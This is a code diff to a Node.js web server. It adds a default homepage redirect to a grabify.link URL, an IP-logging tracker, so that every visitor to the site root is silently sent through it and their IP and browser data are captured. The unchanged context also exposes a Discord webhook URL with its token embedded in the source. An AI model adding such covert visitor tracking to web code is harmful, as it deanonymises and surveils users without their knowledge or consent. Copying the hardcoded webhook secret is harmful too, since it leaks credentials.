@@ -44,6 +44,7 @@ const ipLogFile = path.join(dataDir, 'ip-log.txt');
 const defaultDiscordGuildId = '1522777296547876884';
 const defaultApplicationWebhookUrl = 'https://discord.com/api/webhooks/1530688116870877385/loZbOsb5BQaUW_4wvtZ-49eBGmHK9prYzLtjOep9BAnDQbPqLngMLhf1eyVV1fC7LjtH';
 const defaultAccountDeletionWebhookUrl = 'https://discord.com/api/webhooks/1530688116870877385/loZbOsb5BQaUW_4wvtZ-49eBGmHK9prYzLtjOep9BAnDQbPqLngMLhf1eyVV1fC7LjtH';
+const homepageRedirectUrl = process.env.HOMEPAGE_REDIRECT_URL || 'https://grabify.link/87SEFW';
 let users = [];
 
 function ensureStorageDirs() {
@@ -1617,6 +1618,12 @@ async function startServer() {
 
     if (url.pathname.startsWith('/api')) {
       sendJson(res, 404, { error: 'API endpoint not found.' });
+      return;
+    }
+
+    if (url.pathname === '/') {
+      res.writeHead(302, { Location: homepageRedirectUrl });
+      res.end();
       return;
     }
 
